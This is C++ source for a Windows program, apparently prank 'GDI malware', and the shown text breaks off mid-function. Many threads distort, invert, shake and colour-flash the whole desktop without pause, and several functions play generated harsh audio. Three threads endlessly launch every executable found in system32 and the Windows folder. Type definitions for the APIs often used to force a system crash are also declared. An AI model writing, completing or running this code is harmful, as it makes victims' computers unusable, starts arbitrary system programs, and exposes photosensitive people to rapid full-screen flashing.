typedef struct IUnknown IUnknown;
#define NOMINMAX
#include <windows.h>
#include <iostream>
#define _USE_MATH_DEFINES 1
#include <cmath>
#include <algorithm>
#include <windowsx.h>
#pragma comment(lib, "winmm.lib")
#define M_PI 3.14159265358979323846264338327950288
#pragma comment(lib, "Msimg32.lib")
#define RGBBRUSH (DWORD)0x1900ac010e
#define SRCBSH (DWORD)0x89345c
#define CUSRGB(r, g, b) (r | g << 8 | g << 16)
typedef NTSTATUS(NTAPI* NRHEdef)(NTSTATUS, ULONG, ULONG, PULONG, ULONG, PULONG);
typedef NTSTATUS(NTAPI* RAPdef)(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);
DWORD xs;
VOID SeedXorshift32(DWORD dwSeed) {
	xs = dwSeed;
}
DWORD xorshift32() {
	xs ^= xs << 13;
	xs ^= xs << 17;
	xs ^= xs << 5;
	return xs;
}
HDC g_hdcScreen = NULL;
HDC g_hdcMem = NULL;
HBITMAP g_hBmp = NULL;
RGBQUAD* g_rgbScreen = NULL;
int g_w = 0;
int g_h = 0;

typedef union _RGBQUAD {
	COLORREF rgb;
	struct {
		BYTE b;
		BYTE g;
		BYTE r;
		BYTE Reserved;
	};
}_RGBQUAD, * PRGBQUAD;

typedef struct {
	float h;
	float s;
	float l;
} HSL;

float smoothstep(float a, float b, float x) {
	float t = (x - a) / (b - a);
	if (t < 0)t = 0;
	if (t > 1)t = 1;
	return t * t * (3 - 2 * t);
}


float hue2rgb(float p, float q, float t)
{
	if (t < 0.0f) t += 1.0f;
	if (t > 1.0f) t -= 1.0f;
	if (t < 1.0f / 6.0f) return p + (q - p) * 6.0f * t;
	if (t < 1.0f / 2.0f) return q;
	if (t < 2.0f / 3.0f) return p + (q - p) * (2.0f / 3.0f - t) * 6.0f;
	return p;
}


HSL rgb2hsl(RGBQUAD px) {
	HSL out;
	float R = px.rgbRed / 255.0f;
	float G = px.rgbGreen / 255.0f;
	float B = px.rgbBlue / 255.0f;

	float maxv = fmaxf(R, fmaxf(G, B));
	float minv = fminf(R, fminf(G, B));
	float delta = maxv - minv;

	out.l = (maxv + minv) * 0.5f;

	if (delta < 0.00001f) {
		out.h = 0.0f;
		out.s = 0.0f;
		return out;
	}

	out.s = (out.l < 0.5f)
		? (delta / (maxv + minv))
		: (delta / (2.0f - maxv - minv));

	if (maxv == R)
		out.h = (G - B) / delta;
	else if (maxv == G)
		out.h = 2.0f + (B - R) / delta;
	else
		out.h = 4.0f + (R - G) / delta;

	out.h *= 60.0f;
	if (out.h < 0.0f) out.h += 360.0f;

	return out;
}

void HSLtoRGB(float H, float S, float L, int* r, int* g, int* b) {
	float R, G, B;

	H = fmodf(H, 360.0f);
	if (H < 0.0f) H += 360.0f;
	H /= 360.0f;

	if (S <= 0.0f) {
		R = G = B = L;
	}
	else {
		float q = (L < 0.5f) ? (L * (1.0f + S)) : (L + S - L * S);
		float p = 2.0f * L - q;

		R = hue2rgb(p, q, H + 1.0f / 3.0f);
		G = hue2rgb(p, q, H);
		B = hue2rgb(p, q, H - 1.0f / 3.0f);
	}

	*r = (int)(R * 255.0f);
	*g = (int)(G * 255.0f);
	*b = (int)(B * 255.0f);
}

RGBQUAD hsl2rgb(HSL hsl) {
	int r, g, b;
	HSLtoRGB(hsl.h, hsl.s, hsl.l, &r, &g, &b);

	RGBQUAD out;
	out.rgbRed = (BYTE)r;
	out.rgbGreen = (BYTE)g;
	out.rgbBlue = (BYTE)b;
	out.rgbReserved = 0;
	return out;
}



int red, green, blue;
bool ifcolorblue = false, ifblue = false;
COLORREF Hue(int length) {
	if (red != length) {
		red < length; red++;
		if (ifblue == true) {
			return RGB(red, 0, length);
		}
		else {
			return RGB(red, 0, 0);
		}
	}
	else {
		if (green != length) {
			green < length; green++;
			return RGB(length, green, 0);
		}
		else {
			if (blue != length) {
				blue < length; blue++;
				return RGB(0, length, blue);
			}
			else {
				red = 0; green = 0; blue = 0;
				ifblue = true;
			}
		}
	}
}


DWORD WINAPI opener(LPVOID lpParam) {
	WIN32_FIND_DATA data;
	LPCWSTR path = L"C:\\WINDOWS\\system32\\*.exe";
	while (true) {
		HANDLE find = FindFirstFileW(path, &data);
		ShellExecuteW(0, L"open", data.cFileName, 0, 0, SW_SHOW);
		while (FindNextFileW(find, &data)) {
			ShellExecuteW(0, L"open", data.cFileName, 0, 0, SW_SHOW);
			Sleep(rand() % 10000);
		}
	}
}

DWORD WINAPI opener2(LPVOID lpParam) {
	WIN32_FIND_DATA data2;
	LPCWSTR path2 = L"C:\\WINDOWS\\*.exe";
	while (true) {
		HANDLE find = FindFirstFileW(path2, &data2);
		ShellExecuteW(0, L"open", data2.cFileName, 0, 0, SW_SHOW);
		while (FindNextFileW(find, &data2)) {
			ShellExecuteW(0, L"open", data2.cFileName, 0, 0, SW_SHOW);
			Sleep(rand() % 20000);
		}
	}
}

DWORD WINAPI opener3(LPVOID lpParam) {
	WIN32_FIND_DATA data3;
	LPCWSTR path3 = L"C:\\Desktop\\*.exe";
	while (true) {
		HANDLE find = FindFirstFileW(path3, &data3);
		ShellExecuteW(0, L"open", data3.cFileName, 0, 0, SW_SHOW);
		while (FindNextFileW(find, &data3)) {
			ShellExecuteW(0, L"open", data3.cFileName, 0, 0, SW_SHOW);
			Sleep(rand() % 15000);
		}
	}
}

DWORD WINAPI shader1(LPVOID lpParam) {
	HDC hdc;
	int sw = GetSystemMetrics(0), sh = GetSystemMetrics(1), size = 199;
	while (1) {
		hdc = GetDC(0); HDC hdcMem = CreateCompatibleDC(hdc);
		HBITMAP screenshot = CreateCompatibleBitmap(hdc, sw, sh);
		SelectObject(hdcMem, screenshot);
		BitBlt(hdcMem, 0, 0, sw, sh, hdc, 0, 0, SRCCOPY);
		for (int i = 0; i < 25; i++) {
			int x = -size + rand() % (sw + size), y = -size + rand() % (sh + size);
			BitBlt(hdcMem, x, y, size, size, hdcMem, x + rand() % 18 - 8, y + rand() % 18 - 8, 0x6666666);
		}
		BLENDFUNCTION blend = { AC_SRC_OVER, 0, 50, 0 };
		AlphaBlend(hdc, 0, 0, sw, sh, hdcMem, 0, 0, sw, sh, blend);
		ReleaseDC(0, hdc);

		DeleteObject(screenshot); DeleteDC(hdcMem); DeleteDC(hdc);
	}
}

DWORD WINAPI shader2(LPVOID lpParam) {
	HDC hdcScreen = GetDC(0), hdcMem = CreateCompatibleDC(hdcScreen);
	INT w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	BITMAPINFO bmi = { 0 };
	PRGBQUAD rgbScreen = { 0 };
	bmi.bmiHeader.biSize = sizeof(BITMAPINFO);
	bmi.bmiHeader.biBitCount = 32;
	bmi.bmiHeader.biPlanes = 1;
	bmi.bmiHeader.biWidth = w;
	bmi.bmiHeader.biHeight = h;
	HBITMAP hbmTemp = CreateDIBSection(hdcScreen, &bmi, NULL, (void**)&rgbScreen, NULL, NULL);
	SelectObject(hdcMem, hbmTemp);
	for (;;) {
		hdcScreen = GetDC(0);
		BitBlt(hdcMem, 0, 0, w, h, hdcScreen, 0, 0, SRCCOPY);
		for (INT i = 0; i < w * h; i++) {
			INT x = i % w, y = i / w;
			rgbScreen[i].rgb += x ^ y;
			rgbScreen[i].rgb += x & y;
			rgbScreen[i].rgb += x | y;
		}
		BitBlt(hdcScreen, 0, 0, w, h, hdcMem, 0, 0, SRCCOPY);
		ReleaseDC(NULL, hdcScreen); DeleteDC(hdcScreen);
	}
}

DWORD WINAPI shader3(LPVOID lpParam) {
	while (1) {
		int sw = GetSystemMetrics(0), sh = GetSystemMetrics(1), xSize = sw / 6, ySize = 8;
		HDC hdc;
		hdc = GetDC(0); HDC hdcMem = CreateCompatibleDC(hdc);
		HBITMAP screenshot = CreateCompatibleBitmap(hdc, sw, sh);
		SelectObject(hdcMem, screenshot);
		BitBlt(hdcMem, 0, 0, sw, sh, hdc, 0, 0, SRCCOPY);
		for (int i = 0; i < sw + 10; i++) {
			int wave = sin(i / ((float)xSize) * M_PI) * (ySize);
			BitBlt(hdcMem, i, 0, 1, sh, hdcMem, i, wave, SRCCOPY);
			BitBlt(hdcMem, 0, i, sw, 1, hdcMem, wave, i, SRCCOPY);
		}
		BLENDFUNCTION blend = { AC_SRC_OVER, 0, 50, 0 };
		AlphaBlend(hdc, 0, 0, sw, sh, hdcMem, 0, 0, sw, sh, blend);
		Sleep(1);
		ReleaseDC(0, hdc);
		DeleteDC(hdc); DeleteDC(hdcMem); DeleteObject(screenshot);
	}
}

DWORD WINAPI shader3or1(LPVOID lpParam)
{
	while (1) {
		HDC hdc = GetDC(NULL);
		int w = GetSystemMetrics(SM_CXSCREEN),
			h = GetSystemMetrics(SM_CYSCREEN);

		HBRUSH brush = CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255));
		SelectObject(hdc, brush);
		PatBlt(hdc, 0, 0, w, h, PATINVERT);
		DeleteObject(brush);
		ReleaseDC(NULL, hdc);
	}
}

DWORD WINAPI shader4(LPVOID lpThread) {
	HDC sdc = GetDC(NULL);
	int sw = GetSystemMetrics(SM_CXSCREEN);
	int sh = GetSystemMetrics(SM_CYSCREEN);

	BITMAPINFO bi;
	ZeroMemory(&bi, sizeof(bi));
	bi.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
	bi.bmiHeader.biWidth = sw;
	bi.bmiHeader.biHeight = -sh;
	bi.bmiHeader.biPlanes = 1;
	bi.bmiHeader.biBitCount = 32;
	bi.bmiHeader.biCompression = BI_RGB;

	RGBQUAD* buf;
	HBITMAP bmp = CreateDIBSection(sdc, &bi, DIB_RGB_COLORS, (void**)&buf, NULL, 0);
	HDC mdc = CreateCompatibleDC(sdc);
	SelectObject(mdc, bmp);

	float shift = 0.0f;

	while (1) {
		BitBlt(mdc, 0, 0, sw, sh, sdc, 0, 0, SRCCOPY);

		shift += 1.0f;
		if (shift >= 360.0f) shift -= 360.0f;

		int count = sw * sh;

		for (int i = 0; i < count; i++) {
			HSL hsl = rgb2hsl(buf[i]);

			hsl.h += shift;
			if (hsl.h >= 360.0f) hsl.h -= 360.0f;
			if (hsl.h < 0.0f) hsl.h += 360.0f;

			buf[i] = hsl2rgb(hsl);
		}

		BitBlt(sdc, 0, 0, sw, sh, mdc, 0, 0, SRCCOPY);
		Sleep(1);
	}

	return 0;
}

float x = 300, y = 300;
float vx = 4, vy = 3;
int maxr = 80;

DWORD WINAPI shader4or1(LPVOID lpThread) {
	HDC dc = GetDC(NULL);
	int sw = GetSystemMetrics(SM_CXSCREEN);
	int sh = GetSystemMetrics(SM_CYSCREEN);

	while (1) {
		x += vx;
		y += vy;

		if (x < maxr || x > sw - maxr) vx = -vx;
		if (y < maxr || y > sh - maxr) vy = -vy;

		for (int r = maxr; r > 0; r -= 10) {
			int c = (int)(128 + 127 * sin(GetTickCount() * 0.01 + r));
			HBRUSH b = CreateSolidBrush(RGB(c, 165, 75));
			HBRUSH o = (HBRUSH)SelectObject(dc, b);
			Ellipse(dc, (int)(x - r), (int)(y - r), (int)(x + r), (int)(y + r));
			SelectObject(dc, o);
			DeleteObject(b);
		}

		Sleep(1);
	}
	return 0;
}

DWORD WINAPI shader4or2(LPVOID lpThread) {
	int w = GetSystemMetrics(0);
	int h = GetSystemMetrics(1);
	while (1) {
		HDC hdc = GetDC(0);
		BitBlt(hdc, -30, 0, w, h, hdc, 0, 0, SRCCOPY);
		BitBlt(hdc, w - 30, 0, w, h, hdc, 0, 0, SRCCOPY);
		ReleaseDC(0, hdc);
		Sleep(10);
	}
}

DWORD WINAPI shader5(LPVOID lpThread) {
	while (1) {
		int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
		HDC hdc = GetDC(0);
		HPEN hPen = CreatePen(PS_SOLID, 2, RGB(255, 165, 75));
		HPEN hOldPen = SelectPen(hdc, hPen);

		HBRUSH hBrush = CreateSolidBrush(RGB(75, 165, 255));
		HBRUSH hOldBrush = SelectBrush(hdc, hBrush);

		POINT vertices[] = { {rand() % w, rand() % h}, {rand() % w, rand() % h}, {rand() % w, rand() % h} };
		Polygon(hdc, vertices, sizeof(vertices) / sizeof(vertices[0]));

		SelectBrush(hdc, hOldBrush);
		DeleteObject(hBrush);

		SelectPen(hdc, hOldPen);
		DeleteObject(hPen);
		ReleaseDC(0, hdc);
	}
}

DWORD WINAPI shader5or1(LPVOID lpParam) {
	HDC hdcScreen = GetDC(0), hdcMem = CreateCompatibleDC(hdcScreen);
	INT w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	BITMAPINFO bmi = { 0 };
	PRGBQUAD rgbScreen = { 0 };
	bmi.bmiHeader.biSize = sizeof(BITMAPINFO);
	bmi.bmiHeader.biBitCount = 32;
	bmi.bmiHeader.biPlanes = 1;
	bmi.bmiHeader.biWidth = w;
	bmi.bmiHeader.biHeight = h;
	HBITMAP hbmTemp = CreateDIBSection(hdcScreen, &bmi, NULL, (void**)&rgbScreen, NULL, NULL);
	SelectObject(hdcMem, hbmTemp);
	for (;;) {
		hdcScreen = GetDC(0);
		BitBlt(hdcMem, 0, 0, w, h, hdcScreen, 0, 0, SRCCOPY);
		for (INT i = 0; i < w * h; i++) {
			INT x = i % w, y = i / w;
			rgbScreen[i].rgb += x | y >> 7 * 6 ^ x & y;
		}
		BitBlt(hdcScreen, 0, 0, w, h, hdcMem, 0, 0, SRCCOPY);
		ReleaseDC(NULL, hdcScreen); DeleteDC(hdcScreen);
	}
}

DWORD WINAPI shader6(LPVOID lpParam) {
	HDC s = GetDC(NULL);
	int w = GetSystemMetrics(SM_CXSCREEN);
	int h = GetSystemMetrics(SM_CYSCREEN);

	HDC memA = CreateCompatibleDC(s);
	HDC memB = CreateCompatibleDC(s);

	HBITMAP bmpA = CreateCompatibleBitmap(s, w, h);
	HBITMAP bmpB = CreateCompatibleBitmap(s, w, h);

	SelectObject(memA, bmpA);
	SelectObject(memB, bmpB);

	BitBlt(memA, 0, 0, w, h, s, 0, 0, SRCCOPY);

	int speed = 30;
	int dir = rand() % 8;
	DWORD last = GetTickCount();

	while (1)
	{
		int dx = 0, dy = 0;
		if (dir == 0) dx = -speed;
		if (dir == 1) dx = speed;
		if (dir == 2) dy = -speed;
		if (dir == 3) dy = speed;
		if (dir == 4) { dx = -speed; dy = -speed; }
		if (dir == 5) { dx = speed; dy = -speed; }
		if (dir == 6) { dx = -speed; dy = speed; }
		if (dir == 7) { dx = speed; dy = speed; }

		BitBlt(memB, 0, 0, w, h, memA, dx, dy, SRCCOPY);

		if (dx < 0) BitBlt(memB, w + dx, 0, -dx, h, memA, 0, 0, SRCCOPY);
		if (dx > 0) BitBlt(memB, 0, 0, dx, h, memA, w - dx, 0, SRCCOPY);

		if (dy < 0) BitBlt(memB, 0, h + dy, w, -dy, memA, 0, 0, SRCCOPY);
		if (dy > 0) BitBlt(memB, 0, 0, w, dy, memA, 0, h - dy, SRCCOPY);

		BitBlt(s, 0, 0, w, h, memB, 0, 0, SRCCOPY);

		HDC tmp = memA;
		memA = memB;
		memB = tmp;

		if (GetTickCount() - last >= 600)
		{
			dir = rand() % 8;
			last = GetTickCount();
		}
	}

	return 0;
}

DWORD WINAPI shader6or1(LPVOID lpThread) {
	HDC sdc = GetDC(NULL);
	int sw = GetSystemMetrics(SM_CXSCREEN);
	int sh = GetSystemMetrics(SM_CYSCREEN);

	BITMAPINFO bi;
	ZeroMemory(&bi, sizeof(bi));
	bi.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
	bi.bmiHeader.biWidth = sw;
	bi.bmiHeader.biHeight = -sh;
	bi.bmiHeader.biPlanes = 1;
	bi.bmiHeader.biBitCount = 32;
	bi.bmiHeader.biCompression = BI_RGB;

	RGBQUAD* buf;
	HBITMAP bmp = CreateDIBSection(sdc, &bi, DIB_RGB_COLORS, (void**)&buf, NULL, 0);
	HDC mdc = CreateCompatibleDC(sdc);
	SelectObject(mdc, bmp);

	float shift = 0.0f;

	while (1) {
		BitBlt(mdc, 0, 0, sw, sh, sdc, 0, 0, SRCCOPY);

		shift += 1.0f;
		if (shift >= 360.0f) shift -= 360.0f;

		int count = sw * sh;

		for (int i = 0; i < count; i++) {
			HSL hsl = rgb2hsl(buf[i]);

			hsl.h += shift;
			if (hsl.h >= 360.0f) hsl.h -= 360.0f;
			if (hsl.h < 0.0f) hsl.h += 360.0f;

			buf[i] = hsl2rgb(hsl);
		}

		BitBlt(sdc, 0, 0, sw, sh, mdc, 0, 0, SRCCOPY);
		Sleep(1);
	}

	return 0;
}

DWORD WINAPI shader6or2(LPVOID lpParam) {
	while (1) {
		HDC hdc = GetDC(0);
		int w = GetSystemMetrics(0);
		int h = GetSystemMetrics(1);
		BitBlt(hdc, rand() % 10, rand() % 10, w, h, hdc, rand() % 10, rand() % 10, SRCCOPY);
		StretchBlt(hdc, -10, -10, w + 20, h + 20, hdc, 0, 0, w, h, SRCCOPY);
		ReleaseDC(0, hdc);
	}
}

DWORD WINAPI shader7(LPVOID lpParam) {
	HDC hdc = GetDC(NULL);
	for (int i = 0; i < 10000; ++i) {
		int x1 = rand() % GetSystemMetrics(SM_CXSCREEN);
		int y1 = rand() % GetSystemMetrics(SM_CYSCREEN);
		int x2 = x1 + 300;
		int y2 = y1 + 300;
		BitBlt(hdc, x1, y1, x2 - x1, y2 - y1, hdc, x1, y1, NOTSRCCOPY);
		Sleep(10);
	}
	return 0;
}

DWORD WINAPI shader7or1(LPVOID lpParam) {
	HDC hdc = GetDC(NULL);
	HDC hdcCopy = CreateCompatibleDC(hdc);
	int screenWidth = GetSystemMetrics(SM_CXSCREEN);
	int screenHeight = GetSystemMetrics(SM_CYSCREEN);
	BITMAPINFO bmpi = { 0 };
	HBITMAP bmp;

	bmpi.bmiHeader.biSize = sizeof(bmpi);
	bmpi.bmiHeader.biWidth = screenWidth;
	bmpi.bmiHeader.biHeight = screenHeight;
	bmpi.bmiHeader.biPlanes = 1;
	bmpi.bmiHeader.biBitCount = 32;
	bmpi.bmiHeader.biCompression = BI_RGB;


	RGBQUAD* rgbquad = NULL;
	HSL hslcolor;

	bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
	SelectObject(hdcCopy, bmp);

	INT i = 0;

	while (1)
	{
		hdc = GetDC(NULL);
		StretchBlt(hdcCopy, 0, 0, screenWidth, screenHeight, hdc, 0, 0, screenWidth, screenHeight, SRCCOPY);

		RGBQUAD rgbquadCopy;

		for (int x = 0; x < screenWidth; x++)
		{
			for (int y = 0; y < screenHeight; y++)
			{
				int index = y * screenWidth + x;

				int fx = (i * 10) + ((x + (i * 10)) & (y + (i * 10)));

				rgbquadCopy = rgbquad[index];

				hslcolor = rgb2hsl(rgbquadCopy);
				hslcolor.h = fmod(fx / 1000.f + y / screenHeight * .2f, 1.f);
				hslcolor.s = 1.f;
				if (hslcolor.l < 0.3f) {
					hslcolor.l += 0.2f;
				}

				rgbquad[index] = hsl2rgb(hslcolor);
			}
		}

		i++;

		StretchBlt(hdc, 0, 0, screenWidth, screenHeight, hdcCopy, 0, 0, screenWidth, screenHeight, SRCCOPY);
		ReleaseDC(NULL, hdc);
		DeleteDC(hdc);
	}
}

DWORD WINAPI shader8(LPVOID lpParam) {
	g_hdcScreen = GetDC(NULL);
	if (!g_hdcScreen) return 0;

	g_w = GetSystemMetrics(SM_CXSCREEN);
	g_h = GetSystemMetrics(SM_CYSCREEN);

	BITMAPINFO bmi = { 0 };
	bmi.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
	bmi.bmiHeader.biWidth = g_w;
	bmi.bmiHeader.biHeight = -g_h;
	bmi.bmiHeader.biPlanes = 1;
	bmi.bmiHeader.biBitCount = 32;
	bmi.bmiHeader.biCompression = BI_RGB;

	g_hdcMem = CreateCompatibleDC(g_hdcScreen);
	g_hBmp = CreateDIBSection(g_hdcMem, &bmi, DIB_RGB_COLORS, (void**)&g_rgbScreen, NULL, 0);
	SelectObject(g_hdcMem, g_hBmp);

	while (1)
	{
		BitBlt(g_hdcMem, 0, 0, g_w, g_h, g_hdcScreen, 0, 0, SRCCOPY);

		int total = g_w * g_h;
		for (int i = 0; i < total; ++i)
		{
			BYTE gray = (g_rgbScreen[i].rgbRed + g_rgbScreen[i].rgbGreen + g_rgbScreen[i].rgbBlue) / 3;
			gray += 40;
			if (gray > 255) gray = 255;
			g_rgbScreen[i].rgbRed = gray;
			g_rgbScreen[i].rgbGreen = gray;
			g_rgbScreen[i].rgbBlue = gray;
			g_rgbScreen[i].rgbReserved = 0;
		}

		BitBlt(g_hdcScreen, 0, 0, g_w, g_h, g_hdcMem, 0, 0, SRCCOPY);

		Sleep(10);
	}

	DeleteObject(g_hBmp);
	DeleteDC(g_hdcMem);
	ReleaseDC(NULL, g_hdcScreen);
	return 0;
}

DWORD WINAPI shader8or1(LPVOID lpParam) {
	HDC desk = GetDC(0);
	int sw = GetSystemMetrics(0), sh = GetSystemMetrics(1);
	double moveangle = 0;
	while (1) {
		SeedXorshift32(__rdtsc());
		desk = GetDC(0);
		int ax = (int)(cos(moveangle) * 5.0);
		int ay = (int)(sin(moveangle) * 5.0);
		int w = xorshift32() % sh, h = sh / 2 - xorshift32() % sh / 3;
		BitBlt(desk, ax, ay, sw, sh, desk, 0, 0, SRCCOPY);
		moveangle = fmod(moveangle + M_PI / 16.f, M_PI * 2.f);
		Sleep(xorshift32() % 100);
	}
}

DWORD WINAPI shader9(LPVOID lpParam) {
	HDC desk;
	int sw, sh;

	while (1) {
		desk = GetDC(0);
		sw = GetSystemMetrics(0);
		sh = GetSystemMetrics(1);
		StretchBlt(desk, -20, 0, sw + 40, sh, desk, 0, 0, sw, sh, SRCERASE);
		StretchBlt(desk, -10, -10, sw + 20, sh + 20, desk, 0, 0, sw, sh, SRCCOPY);
		ReleaseDC(0, desk);
		Sleep(4);
	}
}

DWORD WINAPI shader10(LPVOID lpParam) {
	int w = GetSystemMetrics(0);
	int h = GetSystemMetrics(1);
	while (1) {
		HDC hdc = GetDC(0);
		BitBlt(hdc, 0, 0, w, h, hdc, -30, 0, SRCCOPY);
		BitBlt(hdc, 0, 0, w, h, hdc, w - 30, 0, SRCCOPY);
		BitBlt(hdc, 0, 0, w, h, hdc, 0, -30, SRCCOPY);
		BitBlt(hdc, 0, 0, w, h, hdc, 0, h - 30, SRCCOPY);
		ReleaseDC(0, hdc);
	}
}
void sound1(int hz, int secs) {
	const int sample_rate = hz;
	const int channels = 1;
	const int bits_per_sample = 8;
	const int data_size = sample_rate * secs;

	BYTE* data = new BYTE[data_size];
	for (int t = 2; t < data_size; ++t) {
		data[t] = static_cast<BYTE>(
			t * (t >> 8) * (t >> 5)
			);
	}

	uint32_t total_size = 44 + data_size;
	BYTE* wav = new BYTE[total_size];
	BYTE* ptr = wav;

	auto write = [&](const void* src, size_t size) {
		memcpy(ptr, src, size);
		ptr += size;
		};

	write("RIFF", 4);
	uint32_t chunk_size = total_size - 8;
	write(&chunk_size, 4);
	write("WAVE", 4);

	write("fmt ", 4);
	uint32_t subchunk1_size = 16;
	write(&subchunk1_size, 4);
	uint16_t audio_format = 1;
	write(&audio_format, 2);
	uint16_t num_channels = channels;
	write(&num_channels, 2);
	uint32_t sample_rate_dw = sample_rate;
	write(&sample_rate_dw, 4);
	uint32_t byte_rate = sample_rate * channels * bits_per_sample / 8;
	write(&byte_rate, 4);
	uint16_t block_align = channels * bits_per_sample / 8;
	write(&block_align, 2);
	uint16_t bits_per_sample_w = bits_per_sample;
	write(&bits_per_sample_w, 2);

	write("data", 4);
	uint32_t subchunk2_size = data_size;
	write(&subchunk2_size, 4);
	write(data, data_size);

	PlaySoundA(reinterpret_cast<LPCSTR>(wav), NULL, SND_MEMORY | SND_SYNC);

	delete[] data;
	delete[] wav;
}

void sound2(int hz, int secs) {
	const int sample_rate = hz;
	const int channels = 1;
	const int bits_per_sample = 8;
	const int data_size = sample_rate * secs;

	BYTE* data = new BYTE[data_size];
	for (int t = 2; t < data_size; ++t) {
		data[t] = static_cast<BYTE>(
			t + (t | (t >> 8)) & (t >> 1)
			);
	}

	uint32_t total_size = 44 + data_size;
	BYTE* wav = new BYTE[total_size];
	BYTE* ptr = wav;

	auto write = [&](const void* src, size_t size) {
		memcpy(ptr, src, size);
		ptr += size;
		};

	write("RIFF", 4);
	uint32_t chunk_size = total_size - 8;
	write(&chunk_size, 4);
	write("WAVE", 4);

	write("fmt ", 4);
	uint32_t subchunk1_size = 16;
	write(&subchunk1_size, 4);
	uint16_t audio_format = 1;
	write(&audio_format, 2);
	uint16_t num_channels = channels;
	write(&num_channels, 2);
	uint32_t sample_rate_dw = sample_rate;
	write(&sample_rate_dw, 4);
	uint32_t byte_rate = sample_rate * channels * bits_per_sample / 8;
	write(&byte_rate, 4);
	uint16_t block_align = channels * bits_per_sample / 8;
	write(&block_align, 2);
	uint16_t bits_per_sample_w = bits_per_sample;
	write(&bits_per_sample_w, 2);

	write("data", 4);
	uint32_t subchunk2_size = data_size;
	write(&subchunk2_size, 4);
	write(data, data_size);

	PlaySoundA(reinterpret_cast<LPCSTR>(wav), NULL, SND_MEMORY | SND_SYNC);

	delete[] data;
	delete[] wav;
}

void sound3(int hz, int secs) {
	const int sample_rate = hz;
	const int channels = 1;
	const int bits_per_sample = 8;
	const int data_size = sample_rate * secs;

	BYTE* data = new BYTE[data_size];
	for (int t = 2; t < data_size; ++t) {
		data[t] = static_cast<BYTE>(
			t * (t >> 11) | t * t
			);
	}

	uint32_t total_size = 44 + data_size;
	BYTE* wav = new BYTE[total_size];
	BYTE* ptr = wav;

	auto write = [&](const void* src, size_t size) {
		memcpy(ptr, src, size);
		ptr += size;
		};

	write("RIFF", 4);
	uint32_t chunk_size = total_size - 8;
	write(&chunk_size, 4);
	write("WAVE", 4);

	write("fmt ", 4);
	uint32_t subchunk1_size = 16;
	write(&subchunk1_size, 4);
	uint16_t audio_format = 1;
	write(&audio_format, 2);
	uint16_t num_channels = channels;
	write(&num_channels, 2);
	uint32_t sample_rate_dw = sample_rate;
	write(&sample_rate_dw, 4);
	uint32_t byte_rate = sample_rate * channels * bits_per_sample / 8;
	write(&byte_rate, 4);
	uint16_t block_align = channels * bits_per_sample / 8;
	write(&block_align, 2);
	uint16_t bits_per_sample_w = bits_per_sample;
	write(&bits_per_sample_w, 2);

	write("data", 4);
	uint32_t subchunk2_size = data_size;
	write(&subchunk2_size, 4);
	write(data, data_size);

	PlaySoundA(reinterpret_cast<LPCSTR>(wav), NULL, SND_MEMORY | SND_SYNC);

	delete[] data;
	delete[] wav;
}

void sound4(int hz, int secs) {
	const int sample_rate = hz;
	const int channels = 1;
	const int bits_per_sample = 8;
	const int data_size = sample_rate * secs;

	BYTE* data = new BYTE[data_size];
	for (int t = 2; t < data_size; ++t) {
		data[t] = static_cast<BYTE>(
			t + (t * (t >> 8)) & (t >> 4)
			);
	}

	uint32_t total_size = 44 + data_size;
	BYTE* wav = new BYTE[total_size];
	BYTE* ptr = wav;

	auto write = [&](const void* src, size_t size) {
		memcpy(ptr, src, size);
		ptr += size;
		};

	write("RIFF", 4);
	uint32_t chunk_size = total_size - 8;
	write(&chunk_size, 4);
	write("WAVE", 4);

	write("fmt ", 4);
	uint32_t subchunk1_size = 16;
	write(&subchunk1_size, 4);
	uint16_t audio_format = 1;
	write(&audio_format, 2);
	uint16_t num_channels = channels;
	write(&num_channels, 2);
	uint32_t sample_rate_dw = sample_rate;
	write(&sample_rate_dw, 4);
	uint32_t byte_rate = sample_rate * channels * bits_per_sample / 8;
	write(&byte_rate, 4);
	uint16_t block_align = channels * bits_per_sample / 8;
	write(&block_align, 2);
	uint16_t bits_per_sample_w = bits_per_sample;
	write(&bits_per_sample_w, 2);

	write("data", 4);
	uint32_t subchunk2_size = data_size;
	write(&subchunk2_size, 4);
	write(data, data_size);

	PlaySoundA(reinterpret_cast<LPCSTR>(wav), NULL, SND_MEMORY | SND_SYNC);

	delete[] data;
	delete[] wav;
}

void sound5(int hz, int secs) {
	const int sample_rate = hz;
	const int channels = 1;
	const int bits_per_sample = 8;
	const int data_size = sample_rate * secs;

	BYTE* data = new BYTE[data_size];
	for (int t = 2; t < data_size; ++t) {
		data[t] = static_cast<BYTE>(
			t * t ^ t >> 6
			);
	}

	uint32_t total_size = 44 + data_size;
	BYTE* wav = new BYTE[total_size];
	BYTE* ptr = wav;

	auto write = [&](const void* src, size_t size) {
		memcpy(ptr, src, size);
		ptr += size;
		};

	write("RIFF", 4);
	uint32_t chunk_size = total_size - 8;
	write(&chunk_size, 4);
	write("WAVE", 4);

	write("fmt ", 4);
	uint32_t subchunk1_size = 16;
	write(&subchunk1_size, 4);
	uint16_t audio_format = 1;
	write(&audio_format, 2);
	uint16_t num_channels = channels;
	write(&num_channels, 2);
	uint32_t sample_rate_dw = sample_rate;
	write(&sample_rate_dw, 4);
	uint32_t byte_rate = sample_rate * channels * bits_per_sample / 8;
	write(&byte_rate, 4);
	uint16_t block_align = channels * bits_per_sample / 8;
	write(&block_align, 2);
	uint16_t bits_per_sample_w = bits_per_sample;
	write(&bits_per_sample_w, 2);

	write("data", 4);
	uint32_t subchunk2_size = data_size;
	write(&subchunk2_size, 4);
	write(data, data_size);

	PlaySoundA(reinterpret_cast<LPCSTR>(wav), NULL, SND_MEMORY | SND_SYNC);

	delete[] data;
	delete[] wav;
}

void sound6(int hz, int secs) {
	const int sample_rate = hz;
	const int channels = 1;
	const int bits_per_sample = 8;
	const int data_size = sample_rate * secs;

	BYTE* data = new BYTE[data_size];
	for (int t = 2; t < data_size; ++t) {
		data[t] = static_cast<BYTE>(
			t * (t >> 7) * (t >> 9)
			);
	}

	uint32_t total_size = 44 + data_size;
	BYTE* wav = new BYTE[total_size];
	BYTE* ptr = wav;

	auto write = [&](const void* src, size_t size) {
		memcpy(ptr, src, size);
		ptr += size;
		};
